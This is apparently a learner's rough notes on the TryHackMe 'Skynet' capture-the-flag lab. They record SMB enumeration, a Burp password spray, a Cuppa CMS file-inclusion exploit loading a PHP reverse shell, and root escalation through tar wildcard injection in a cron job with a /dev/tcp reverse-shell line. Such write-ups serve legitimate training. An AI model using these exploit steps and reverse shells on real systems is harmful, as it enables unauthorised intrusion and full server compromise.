┌──(kali㉿kali)-[~/THM/practice/skynet]
└─$ nmap -sC -sV 10.10.76.236
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-15 12:59 EST
Nmap scan report for 10.10.76.236
Host is up (0.018s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP CAPA UIDL RESP-CODES SASL PIPELINING AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID Pre-login more SASL-IR ENABLE have post-login LOGIN-REFERRALS listed capabilities LOGINDISABLEDA0001 OK IDLE IMAP4rev1 LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-02-15T11:59:58-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-15T17:59:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds


#looking at the page source this error message came up in the console:
The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outside the US-ASCII range. The character encoding of the page must be declared in the document or in the transfer protocol.
        #I think this means the database is not encoded so we can see everything in it

(kali㉿kali)-[~/THM/practice/skynet]
└─$ dirb http://10.10.76.236

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 15 13:01:10 2022
URL_BASE: http://10.10.76.236/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.76.236/ ----
==> DIRECTORY: http://10.10.76.236/admin/                                                                  
==> DIRECTORY: http://10.10.76.236/config/                                                                 
==> DIRECTORY: http://10.10.76.236/css/                                                                    
+ http://10.10.76.236/index.html (CODE:200|SIZE:523)                                                       
==> DIRECTORY: http://10.10.76.236/js/                                                                     
+ http://10.10.76.236/server-status (CODE:403|SIZE:277)                                                    
==> DIRECTORY: http://10.10.76.236/squirrelmail/  

#the squirrelmail subdirectory gives a login page
        #tried using sql injection but did not work



#the first hint says to enumerate samba so I looked up how to
        #from nmap scan the version is Samba 4.3.11-Ubuntu
        #doing a quick google search it comes up a 42084 vuln
#enum4linux:
(kali㉿kali)-[~/THM/practice/skynet]
└─$ enum4linux 10.10.76.236     
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Feb 15 13:32:58 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.76.236
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.76.236    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.76.236    |
 ============================================ 
Looking up status of 10.10.76.236
        SKYNET          <00> -         B <ACTIVE>  Workstation Service
        SKYNET          <03> -         B <ACTIVE>  Messenger Service
        SKYNET          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.76.236    |
 ===================================== 
[+] Server 10.10.76.236 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.76.236    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.76.236    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.76.236 from smbclient: 
[+] Got OS info for 10.10.76.236 from srvinfo:
        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 10.10.76.236    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: 

user:[milesdyson] rid:[0x3e8]

 ========================================= 
|    Share Enumeration on 10.10.76.236    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.76.236
//10.10.76.236/print$   Mapping: DENIED, Listing: N/A
//10.10.76.236/anonymous        Mapping: OK, Listing: OK
//10.10.76.236/milesdyson       Mapping: DENIED, Listing: N/A
//10.10.76.236/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.76.236    |
 ==================================================== 


[+] Attaching to 10.10.76.236 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SKYNET
        [+] Builtin

[+] Password Info for Domain: SKYNET

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.76.236    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.76.236 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2393614426-3774336851-1116533619
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username '', password ''
S-1-5-21-2393614426-3774336851-1116533619-500 *unknown*\*unknown* (8)
S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ============================================= 
|    Getting printer info for 10.10.76.236    |
 ============================================= 
No printers returned.


enum4linux complete on Tue Feb 15 13:34:31 2022

        #seems like Miles was not part of the 'known users' for the target but we got the user 'milesdyson'
#I decided to try and do an sqli with his username
#fire up burp
        #the parameters were:
        login_username=milesdyson&secretkey=%27+or+1%3D1+--+-&js_autodetect_results=1&just_logged_in=1
#but it did not work
        #I could do a burp targeted attack? password list did not want to load...

#next I checked how to connect to smbclient in terminal
(kali㉿kali)-[~/THM/practice/skynet]
└─$ smbclient -L  \\\\10.10.76.236\\                                                                    1 ⨯
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
#I got some reponse, maybe I sohuld try to connect to the milesdyson one
        #did not work as I obvi dont have the password yet...

#after some research I found out there is a way of downloading files on the share:
(kali㉿kali)-[~/THM/practice/skynet]
└─$ smbget -R smb://10.10.76.236/anonymous
Password for [kali] connecting to //anonymous/10.10.76.236: 
Using workgroup WORKGROUP, user kali
smb://10.10.76.236/anonymous/attention.txt                                                                  
smb://10.10.76.236/anonymous/logs/log2.txt                                                                  
smb://10.10.76.236/anonymous/logs/log1.txt                                                                  
smb://10.10.76.236/anonymous/logs/log3.txt                                                                  
Downloaded 634b in 4 seconds
        #anonymous was the only one which said mapping was ok so I assumed getting files would only be possible from this
                ┌──(kali㉿kali)-[~/THM/practice/skynet]
                └─$ smbget -R smb://10.10.76.236/milesdyson
                Password for [kali] connecting to //milesdyson/10.10.76.236: 
                Using workgroup WORKGROUP, user kali
                Can't open directory smb://10.10.76.236/milesdyson: Permission denied
#next I had a look at the files
        #1 there was an attention.txt file:
        ┌──(kali㉿kali)-[~/THM/practice/skynet]
        └─$ cat attention.txt    
        A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
        -Miles Dyson
(kali㉿kali)-[~/THM/practice/skynet/logs]
└─$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
        #now I proceeded to do a burp sniper attack with these passwords as the input
        #I pasted the passwords into the payload and waited to see
#looks like the length of cyborg007haloterminator
(kali㉿kali)-[~/THM/practice/skynet]
└─$ enum4linux -U -o 10.10.76.236
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Feb 15 13:16:55 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.76.236
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.76.236    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ===================================== 
|    Session Check on 10.10.76.236    |
 ===================================== 
[+] Server 10.10.76.236 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.76.236    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.76.236    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.76.236 from smbclient: 
[+] Got OS info for 10.10.76.236 from srvinfo:
        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 10.10.76.236    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: 

user:[milesdyson] rid:[0x3e8]
enum4linux complete on Tue Feb 15 13:16:57 2022
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator

#looks like the cyborg007haloterminator had a diff length than all the others - despite 302 error message
        #its the right one! 

#so I proceeded to login

#apparently there is a hidden directory:

#an email was sent from skynet stating:
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

#the couple other emails contained a bunch of binary code:
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111

#and this
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to

#looking up a binary to text converted, the binary says:
balls have zero to me to me to me to me to me to me to me to me to
which is 3 of the strange messages
        #maybe a password is bhztmtmtmtmtmtmtmt3?? ahahh
#another user available is serenakogan, so maybe we can try and loging using the password above and her name?


#next I tried logging into SMB as milesdyson:cyborg007haloterminator
(kali㉿kali)-[~/THM/practice/skynet]
└─$ smbclient \\\\10.10.76.236\\milesdyson cyborg007haloterminator                                      1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
        #it didnt work and I dont get why

#after a while of trying I relised I dont know how to connect to the smb share so I tried the following
(kali㉿kali)-[~/THM/practice/skynet]
└─$ smbclient //10.10.76.236/anonymous                                                                  1 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5818552 blocks available
smb: \>

#this probably means I can login the same way to milesdyson's share using milesdyson:)s{A&2Z=F^n_E.B`:
(kali㉿kali)-[~/THM/practice/skynet]
└─$ smbclient -U milesdyson //10.10.76.236/milesdyson                                                 130 ⨯
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \>


## THE WAY TO CONNECT TO SMB SHARES IS BY USING FORWARD SLASHES, GETTING INFO IS BACKWARD SLASHES - I believe ##

smb: \> cd \notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

                9204224 blocks of size 1024. 5818552 blocks available
#I went into the notes directory -- having a look at the important.txt (using more command):
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

#going to the website there is a picture of miles dyson
#the way of downloading files from the sbshare is using 'get'

#next I did another dirb search for the directory, maybe theres another admin login page?
(kali㉿kali)-[~/THM/practice/skynet]
└─$ dirb http://10.10.76.236/45kra24zxs28v3yd                                                         130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 15 14:24:19 2022
URL_BASE: http://10.10.76.236/45kra24zxs28v3yd/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.76.236/45kra24zxs28v3yd/ ----
==> DIRECTORY: http://10.10.76.236/45kra24zxs28v3yd/administrator/
#and there it is

#the point now is to comduct a RFI ecploit (remote file inclusion) so I looked up how to do this + with cuppa CMS

#exploitdb shows a way of accessing it by using URL 'poisoning':
An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#this iis the exploit:
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

#so I tried:
http://10.10.76.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
#and it worked..

#next I thought maybe I could find a password to decode
#or I could go straight to the user flag maybe?

#nope --> next was to create a reverse shell
        #1 start listener (nc)
        #2 use php-reverse-shell
        #3 start http.server
(kali㉿kali)-[~/THM/practice/skynet/php-reverse-shell-1.0]
└─$ python3 -m http.server 80    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
        #4 open url to reverse shell in URL
http://10.10.76.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.59.68:80/php-reverse-shell.php
#and we got the shell
(kali㉿kali)-[~/THM/practice/skynet]
└─$ nc -nvlp 4444                                   
listening on [any] 4444 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.76.236] 46836
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 13:45:18 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

#the user flag is 7ce5c2109a40f958099283600a9ae807

#final step is to get the root flag
#the hint says something about a recursive call which I dont really know what is...
        #so I looked it up:

#its a procedure which calls another procedure that calls the first procedure

#1 get a better shell:
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@skynet:/home/milesdyson$

#the backups seemed to be an interesting folder:
www-data@skynet:/home/milesdyson$ ls backups
ls backups
backup.sh  backup.tgz
        #one of them is a shell?

#I am thinking if the .tgz is unzipped this might call the sh which in turn will call the othr and escalate the shell privileges:
www-data@skynet:/home/milesdyson/backups$ ls -la
ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Feb 15 13:51 backup.tgz
#theyre both owned by root, but we can execute the backup.sh one
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
#the program compresses the whole directory 

#looking for some help, it looks ike its executed every minute:
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh 
#^^
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


#IT EXPIRED SO I DECIDED IT WAS TIME TO MAKE DINNER AND COME BACK TO IT NEXT DAY

#1 --> from the nc 4444 listener input the following:
www-data@skynet:/$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.11.59.68/6666 0>&1' > /var/www/html/shell

www-data@skynet:/$ chmod +x /var/www/html/shell

www-data@skynet:/$ touch /var/www/html/--checkpoint=1

www-data@skynet:/$ touch /var/www/html/--checkpoint-action=exec=bash\ shell


#2 --> we should now have the shell which we can access on the port specified so I sat up a nc listener
www-data@skynet:/$ ls -l /var/www/html
ls -l /var/www/html
total 64
-rw-rw-rw- 1 www-data www-data     0 Feb 16 11:11 --checkpoint-action=exec=bash shell
-rw-rw-rw- 1 www-data www-data     0 Feb 16 11:11 --checkpoint=1
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    53 Feb 16 11:10 shell
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css

(kali㉿kali)-[~/THM/practice/skynet]
└─$ nc -nvlp 6666 
listening on [any] 6666 ...

#3 --> wait for a minute or so for the cron job to execute again and we should get a root shell
(kali㉿kali)-[~/THM/practice/skynet]
└─$ nc -nvlp 6666 
listening on [any] 6666 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.181.127] 45186
bash: cannot set terminal process group (1720): Inappropriate ioctl for device
bash: no job control in this shell
root@skynet:/var/www/html#

root@skynet:~# cat root.txt
cat root.txt
3f0372db24753accc7179a282cd6a949


#there we go:)